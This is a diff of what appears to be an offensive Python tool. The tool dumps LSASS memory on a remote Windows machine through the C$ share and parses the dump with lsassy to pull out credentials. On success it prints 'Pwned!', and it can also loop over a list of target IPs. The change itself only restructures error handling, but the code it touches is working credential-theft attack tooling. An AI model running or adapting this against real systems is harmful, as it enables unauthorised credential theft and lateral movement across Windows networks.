@@ -169,21 +169,21 @@ if __name__ == "__main__":
                 command2 = 'lsassy {}/{}:{}@{}:/C$/Windows/Temp/dump.bin'.format(args.domn, args.user, args.pasw, args.targ)
             try:
                 command_output = subprocess.check_output(command1, shell=True)
+                command_output = command_output.decode("utf-8")
+                if "Completed" in command_output:
+                    print("Dump executed on {}...".format(args.targ))
+                else:
+                    print("Error dumping on {}, try again.".format(args.targ))
+                    sys.exit()
+                command_output = subprocess.check_output(command2, shell=True)
+                command_output = command_output.decode("utf-8")
+                if "[+]" in command_output:
+                    print("Pwned!")
+                    print(command_output)
+                else:
+                    print("Nothing to show on lsassy...")
             except subprocess.CalledProcessError as e:
-                print e.output
-            command_output = command_output.decode("utf-8")
-            if "Completed" in command_output:
-                print("Dump executed on {}...".format(args.targ))
-            else:
-                print("Error dumping on {}, try again.".format(args.targ))
-                sys.exit()
-            command_output = subprocess.check_output(command2, shell=True)
-            command_output = command_output.decode("utf-8")
-            if "[+]" in command_output:
-                print("Pwned!")
-                print(command_output)
-            else:
-                print("Nothing to show on lsassy...")
+                print(e.output)
         else:
             f = open(args.targ, 'r').read().split('\n')
             for ip in f:
